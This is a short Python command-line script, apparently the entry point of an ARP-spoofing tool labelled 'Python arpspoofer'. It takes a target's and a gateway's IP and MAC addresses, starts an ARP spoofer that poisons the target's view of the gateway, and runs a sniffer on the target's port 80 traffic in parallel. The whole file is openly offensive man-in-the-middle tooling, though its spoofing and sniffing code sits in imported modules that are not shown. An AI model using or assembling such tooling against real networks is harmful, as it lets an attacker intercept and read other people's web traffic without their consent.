from multiprocessing import Pool
from network import arp, sniff
#pip install argparse
import argparse



def run(i):
    i.run()

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Python arpspoofer')
    parser.add_argument('-t','--target-ip', help='Specify the target ip', required=True)
    parser.add_argument('-m','--target-mac', help='Specify the target MAC', required=True)
    parser.add_argument('-g','--gateway-ip', help='Specify the gateway ip', required=True)
    parser.add_argument('-a','--gateway-mac', help='Specify the gateway MAC', required=True)
    args = vars(parser.parse_args())
    p = Pool(2)
    
    target = [args['target_ip'], args['target_mac']]

    gateway = arp.spoof(args['gateway_ip'], args['gateway_mac'])
    gateway.setTarget(*target)
    
    watch = sniff.watch(target[0], 80)

    p.map(run, [gateway, watch])
